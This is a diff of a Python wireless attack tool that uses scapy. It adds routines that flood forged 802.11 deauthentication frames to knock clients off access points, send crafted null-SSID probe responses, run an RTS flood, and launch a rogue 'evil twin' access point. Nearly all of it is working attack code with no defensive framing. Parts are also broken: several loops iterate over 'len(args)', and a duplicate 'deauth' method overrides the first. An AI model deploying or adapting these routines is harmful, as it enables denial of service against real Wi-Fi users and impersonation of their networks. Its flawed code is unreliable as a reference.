@@ -15,7 +15,7 @@ import sys
 
 import scapy
 from scapy import *
-from scapy.layers.dot11 import RadioTap, Dot11, conf
+from scapy.layers.dot11 import RadioTap, Dot11, conf, Dot11Deauth, Dot11Elt, Dot11ProbeResp
 from scapy.sendrecv import sendp
 
 from Sniffer_dir import FakeAP
@@ -27,14 +27,7 @@ class attacker:
     def __del__(self): # Destroy here all complex fields!!!
         self.screen = ""
 
-    # def cts_flood(self):
-    #     while True:
-    #         print("ABCD")
-    #         time.sleep(1)
-
     def rts_flood(self, args: dict):
-        self.screen = Drawer.drawer()
-
         if "attacking_addr" in args.keys():
             attacking_addr = args["attacking_addr"]
         else:
@@ -60,21 +53,59 @@ class attacker:
         while True:
             sendp(frame, iface=self.attack_int, count=quantity, verbose=0)  # verbose=0, monitor=True
 
+    def deauth(self, args: list[dict], frames_quantity=-1):
+        if frames_quantity == -1:
+            print("Deauth forever")
 
-    def null_probe_response(self):
-        print("null_probe_response")
+            self.attack_int = self.__start_monitor_mode(self.attack_int)
+            while True:
+                for i in len(args):
+                    # if args[i]["Freq"] == '2.4':  # 2.4 GHz
+                    #     self.__change_channel(self.attack_int, int(args[i]["Channel"]))
+                    self.__change_channel(self.attack_int, int(args[i]["Channel"]))
+                    deauth_frame = RadioTap() / Dot11(type=0, subtype=12, addr1=args[i]["MAC"], addr2=args[i]["BSSID"],
+                                                      addr3=args[i]["BSSID"]) / Dot11Deauth(reason=7)
+                    quantity = 10
+                    sendp(deauth_frame, iface=self.attack_int, count=quantity, verbose=0)
+        else:
+            print(f"Sending only {frames_quantity} deauth frames")
+            for i in len(args):
+                # if args[i]["Freq"] == '2.4':  # 2.4 GHz
+                #     self.__change_channel(self.attack_int, int(args[i]["Channel"]))
+                self.__change_channel(self.attack_int, int(args[i]["Channel"]))
+                deauth_frame = RadioTap() / Dot11(type=0, subtype=12, addr1=args[i]["MAC"], addr2=args[i]["BSSID"],
+                                                  addr3=args[i]["BSSID"]) / Dot11Deauth(reason=7)
+                sendp(deauth_frame, iface=self.attack_int, count=frames_quantity, verbose=0)
+
+    def deauth(self, args: dict, frames_quantity=1):
+        print(f"Sending only {frames_quantity} deauth frames")
+        deauth_frame = RadioTap() / Dot11(type=0, subtype=12, addr1=args["MAC"], addr2=args["BSSID"],
+                                          addr3=args["BSSID"]) / Dot11Deauth(reason=7)
+        sendp(deauth_frame, iface=self.attack_int, count=frames_quantity, verbose=0)
+
+    def null_probe_response(self, args: list[dict]):
+        self.attack_int = self.__start_monitor_mode(self.attack_int)
+        while True:
+            for i in len(args):
+                # if args[i]["Freq"] == '2.4':  # 2.4 GHz
+                #     self.__change_channel(self.attack_int, int(args[i]["Channel"]))
+                self.__change_channel(self.attack_int, int(args[i]["Channel"]))
+                self.deauth(args[i], 5)
+
+                null_probe_resp_frame = RadioTap() / Dot11(addr1=args[i]["MAC"], addr2=args[i]["BSSID"], addr3=args[i]["BSSID"]) \
+                                         / Dot11ProbeResp(cap="ESS") \
+                                         / Dot11Elt(ID="SSID",  len=0, info="") \
+                                         / Dot11Elt(ID="Rates", info='\x82\x84\x0b\x16') \
+                                         / Dot11Elt(ID="DSset", info="\x06") \
+                                         / Dot11Elt(ID="TIM",   info="\xFF\xFF\xFF\xFF")
+                sendp(null_probe_resp_frame, iface=self.attack_int, count=10, verbose=0)
 
     def rogue_twin(self, args: dict):
-        self.screen = Drawer.drawer()
-
-        print(args.keys())
-        print(args.values())
         if args["Freq"] == '2.4':  # 2.4 GHz
             self.__change_channel(self.attack_int, int(args["Channel"])) #TODO Сделать различие от диапазона частот
 
-            ap = FakeAP.AP(wirelessiface=self.attack_int, channel=int(args["Channel"]), ssid=args["SSID"])
-            ap.launch()
-
+        ap = FakeAP.AP(wirelessiface=self.attack_int, channel=int(args["Channel"]), ssid=args["SSID"])
+        ap.launch()
 
     def __GetInterfaces(self):
         retval = []
